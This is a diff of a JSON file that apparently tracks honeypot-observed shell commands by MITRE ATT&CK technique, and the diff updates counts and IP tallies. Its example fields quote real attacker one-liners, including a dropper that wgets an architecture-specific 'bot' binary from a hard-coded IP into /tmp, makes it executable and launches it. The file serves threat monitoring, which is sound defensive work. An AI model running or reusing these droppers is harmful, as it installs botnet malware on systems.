@@ -8,8 +8,8 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 124308,
-      "distinct_ips": 393,
+      "count": 124316,
+      "distinct_ips": 394,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
         "echo -e \"\\x6F\\x6B\"",
@@ -25,8 +25,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 11214,
-      "distinct_ips": 550,
+      "count": 11253,
+      "distinct_ips": 551,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "echo 'chmod +x /tmp/.st' >> /tmp/.iu",
@@ -42,8 +42,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2757,
-      "distinct_ips": 418,
+      "count": 2760,
+      "distinct_ips": 419,
       "examples": [
         "m=$(uname -m 2>/dev/null); case $m in arm*) m=arm;; aarch64*) m=aarch64;; mips*el*) m=mipsel;; mips*) m=mips;; i*86*|x86*) m=x86_64;; *) m=arm;; esac; (wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null || wget -q http://176.65.134.121:7372/bot.$m -O /tmp/.z 2>/dev/null) && chmod +x /tmp/.z && (/tmp/.z 176.65.134.121 176.65.134.121 >/dev/null 2>&1 &) >/dev/null 2>&1 &",
         "echo 'wget -q http://176.65.134.121:8080/stub.x86_64 -O /tmp/.st' > /tmp/.iu",
@@ -184,6 +184,6 @@
       ]
     }
   ],
-  "total_commands": 365418,
-  "matched_commands": 136499
+  "total_commands": 365762,
+  "matched_commands": 136546
 }
